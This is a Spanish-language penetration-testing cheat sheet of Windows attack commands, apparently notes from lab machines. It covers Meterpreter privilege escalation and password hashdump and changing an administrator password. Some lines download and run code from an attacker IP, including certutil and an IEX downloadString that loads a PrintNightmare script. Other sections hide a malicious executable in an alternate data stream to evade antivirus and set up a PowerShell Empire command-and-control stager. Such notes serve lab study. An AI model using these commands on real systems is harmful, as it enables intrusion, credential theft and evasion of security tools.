# Comandos Windows

Tags: #Windows #Comandos #PowerShell

## Comandos con Meterpreter

```bash 
# Cuando tienes la sesion con Meterpreter 

❯ ctrl + z                   # Colocas la sesion en 'Background'
❯ sessions                   # Miramos las sesiones activas 
❯ sessions -u <ID>           # Regresamos a la sesion 

❯ sysinfo                  # Muestra informacion del Windows 
❯ pgrep explorer           # Mirar el numero del proceso y asi poder escalar privilegios 
❯ pgrep lsass              # Mirar el numero del proceso y asi poder escalar privilegios 
❯ migrate <ID>             # Nos migramos al proceso 
 
❯ getuid                   # Miramos el nombre del usuario 
❯ getprivs                 # Miramos los privilegios 
❯ getsystem                # Miras los procesos privilegiados 

❯ getprivs                 # Miramos los  procesos con privilegios

❯ hashdump                 # Te muestra todos los hashes de los usuarios 
```


## Comandos con Shell

```bash
❯ net user                                   # Miramos todos los usuarios existentes y sus grupos
❯ net user <User>                            # Miramos el grupo de un usuario especifico
❯ net localgroup administrators              # Miramos los miembros del grupo administrador
❯ net user admin password123                 # Para cambiar la passwd al usuario admin siendo NT Authority 
```
```bash
❯ .\file.exe               # Ejecutamos un arcxhivo .exe en Windows 
```

```bash 
❯ cd DOCUME~1              # Para ir a un dir que tenga espacios en su nombre 'Documents and settings', debemos de colocar las 6 primeras letras 
```

```bash 
❯ systeminfo                                 # Nos muestra la informacion de Windows
❯ sysinfo                                    # Nos muestra algunos detalles de Windows
```

```bash
❯ cls                                        # Nos ayuda a limpiar la pantalla
```

```bash
❯ ipconfig                                   # Nos muestra las interfaces y las direcciones IP
```

```bash
❯ whoami                                     # Miramos el nombre del usuario
```

```bash
❯ dir                                        # Listamos el contenido del directorio
❯ dir /r /s ❮File.txt❯                       # Buscamos de forma recursiva el string .txt
```

```bash
❯ type ❮File❯                                # Nos muestra el contenido del archivo
```

```bash
❯ upload /home/omar/Documet/HTB/nc.exe       # Subimos el archivo Netcat a la maquina victima, colocando la ruta absoluta de la maquina de atacante en donde se encuentra
❯ upload /home/omar/Downloads/Firefox/winpeasx64.exe # Subimos el archivo WinPEAS a la maquina victima, colocando la ruta absoluta de la maquina de atacante en donde se encuentra
❯ certutil.exe -f -urlcache -split http://<IP>/winPeas.exe winPeas.exe           # Subimos el archivo WinPEAS a la maquina victima con la IP de atacante
❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
```

```bash
❯ copy \❮IP❯\\smbFolder\\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante

	# IP = IP de atacante
	# smbFolder = Nombre del folder del recurso compartido
	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
```

## Ocultar data en un archivo txt

Esta forma de ocultar un .exe dentro de un archivo txt nos ayuda a evadir detecciones básicas, antivirus.

```bash 
❯ type payload.exe > windowslog.txt:winpeas.exe    # El archivo payload que contiene el programa malicioso se convertira en un archivo txt llamado windowslog visible y detras sera oculta su data renombrado como winpeas.exe
❯ notepad windowslog.txt                           # Abrimos el archivo y es un archivo txt vacio, en el cual le podemos introducir cualquier data 
❯ start windowslog.txt:winpeas.exe                 # Ejecutamos el winpeas que esta oculto en el archivo de texto 

# Si no lo ejecuta, debemos de crear un enlace simbolico como NT Authority 
❯ cd windows\System32
❯ mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe       # Crear el enlace simbolico  

❯ wupdate                                                     # Ejecutar el programa                                               
```

## Powershell-empire

```bash 
❯ sudo apt install powershell-empire starkiller -y     # Instalamos Poweshell y Starkiller
❯ sudo powershell-empire server                        # Iniciamos el servicio 
❯ sudo powershell-empire client                        # En otra 'terminal' de kali ejecutamos este comando y ahi ejecutaremos los comandos a utilizar
```

```bash 
# Debemos de inciar la app de Starkiller y asi poder usarla. 

	# url = https://localhost:1337
	# u = empireadmin
	# p = password123
```

```bash 
# Todo lo hacemos en el Starkiller

1. Debemos de crear uns 'listener' para podernos conectar al target (http, http_hop)
2. Generar un 'stager' para Windows = 'windows/csharp_exe' y lo descargamos 
3. Transferimos el 'satger' a la maquina victima Windows
4. Ejecutamos el 'stager' como admin en la maquina victima 
5. En la parte de 'Agents' en Starkiller podemos ver la conexion 
	1. En el 'agent' tenemos acceso remoto a la maquina victima 
	2. Podemos ejecutar comandos shell
	3. Podemos ver su arbol de su directorio 'C:\''
	4. Podemos cargar o descargar archivos de sus directorios
```


También podemos usar el Client de Powershell para ejecutar comandos.
```bash 
# Dentro de powershell-empire client, podemos usar los sig comandos

❯ listeners                       # Listar los 'listeners' disponibles 
❯ agents                          # Miramos la conexion que hemos hecho en el Starkiller
❯ interact <agent_name>           # Sirve para ingresar a sistema de la victima 
	❯ help                       # Miramos el menu de ayuda para ver que comandos podemos usar 
	❯ ipconfig 
	❯ history 
```